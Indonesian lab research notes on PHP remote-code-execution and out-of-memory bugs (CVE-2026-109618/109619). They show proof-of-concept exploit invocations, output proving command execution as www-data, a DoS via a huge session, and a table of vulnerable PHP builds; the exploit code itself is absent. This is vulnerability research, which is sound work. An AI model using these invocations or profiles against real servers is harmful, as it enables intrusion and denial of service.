# Hasil Riset CVE-2026-109618 / CVE-2026-109619

## Ringkasan

- **CVE-2026-109618: RCE terbukti** di lab `php:8.5.10-apache` (aarch64), Apache 2.4.68, `libphp.so` sha256 `5f080d44d3f8...`, satu worker prefork.
- **CVE-2026-109619: producer OOM terbukti** di lab `php:8.4.26-fpm` + nginx, tetapi consumer minimal belum memicu stale `BG(unserialize)`. Implementasi FPM publik yang ada butuh base address dari `/proc/<pid>/maps` (bukan fully remote); RCE remote publik belum tersedia.
- Target OpenResty + PHP 8.3.32 + WordPress yang diuji sebelumnya **tidak memenuhi syarat** chain mod_php, dan 8.3.x structurally blocked untuk chain stock ini.

## Lab 109618 yang berhasil

```
Image      : docker.io/library/php:8.5.10-apache (linux/arm64)
Apache     : 2.4.68 (Debian)
PHP        : 8.5.10 (NTS)
libphp sha : 5f080d44d3f85c533ebf5dc69d413976a3d009993a5b4fad93fb567503960a41
Config     : memory_limit=8M, display_errors=On, post_max_size=64M,
             max_input_vars=1000, session.upload_progress=On,
             session.use_strict_mode=0, prefork 1 worker
```

Perintah:

```bash
python3 poc_rce.py -u http://127.0.0.1:8090/nosession.php \
  --auto --arch aarch64 -c "id"
```

Output:

```
[OK] preflight
[+] chunk base: 0xffffb1600000
[+] libphp base: 0xffffae200000
PROOF: uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Custom command:

```bash
python3 poc_rce.py -u http://127.0.0.1:8090/nosession.php \
  --auto --arch aarch64 -c "ls -la"
```

```
PROOF: total 8
drwxr-xr-x  5 www-data www-data 160 Oct 27 05:04 .
...
```

### Bug yang ditemukan saat debugging

Parser leak awalnya hanya menerima alamat x86_64 `0x7f...`. Lab aarch64 menghasilkan alamat `0xffff...` dan `0xe00000`, sehingga Stage 1 selalu dianggap gagal. Range diperbaiki menjadi `0x10000 < v < 2^48` seperti implementasi riset verified.

## Mengapa target OpenResty / PHP 8.3.32 / WordPress gagal

- `Server: openresty` adalah front-end; SAPI heuristic mengarah ke FPM, bukan mod_php.
- Chain 109618 membutuhkan Apache prefork + mod_php.
- PHP 8.3.32 memang affected, tetapi tidak ada profile RCE verified; riset publik menyebut 8.3.x leak-only/structurally blocked untuk chain stock.
- `memory_limit`/`display_errors` tidak terlihat karena `display_errors=Off`, POST ditolak front-end, atau probe tidak mencapai PHP.

## CVE-2026-109619 (FPM)

Lab:

```
Image : php:8.4.26-fpm + nginx:alpine
Pool  : pm=static, pm.max_children=1
Config: memory_limit=8M, display_errors=On, session.upload_progress=On,
        session.save_path=/tmp/sessions
File  : sess_hugesession... berisi session ~30MB
```

Hasil:

- `GET /session_oom.php` dengan cookie `hugesession...` → **OOM selama `php_var_unserialize`** (terbukti).
- `POST /index.php` dengan `PHP_SESSION_UPLOAD_PROGRESS` → 200, belum ada "Session object destruction failed"/502.
- Riset `dinosn/php-cve-2026-10961x-lab-poc` menyebut FPM stale `BG(unserialize)`: mekanisme + DoS terbukti, **RCE unproven**.
- Tool FPM `chain_e_fpm` membutuhkan base address dari `/proc/<pid>/maps` atau flag eksplisit; tanpa itu hasilnya `LEAK_REQUIRED` dan tidak ada request. Jadi bukan chain fully remote.
- Chain E `ikow/php2shell-poc` tersedia untuk subscriber; kode RCE-nya tidak publik.

Kesimpulan 109619: butuh heap-shaped consumer dan/atau base disclosure yang belum ada di publik. Ini riset lanjutan, bukan sekadar ubah parameter.

## Profile verified yang didukung `poc_rce.py`

| Build | Arch | Status |
|---|---|---|
| PHP 8.4.26 | amd64 | RCE verified (riset) |
| PHP 8.5.11 | amd64/aarch64 | RCE verified (riset) |
| PHP 8.5.10 | aarch64 | **RCE terbukti di lab ini** |
| PHP 8.4.25 | aarch64 | leaks-only menurut calibration report |
| PHP 8.3.x | - | tidak ada RCE verified |

## Catatan

- `--check` mengirim body 12MB untuk membaca `memory_limit`; ini aktif dan bisa memicu OOM/worker rotation.
- Jalankan hanya terhadap lab yang kamu miliki/authorized.
- Jangan menjalankan repo pihak ketiga mentah-mentah; yang dipakai di sini adalah data profile/README dan implementasi kita sendiri.
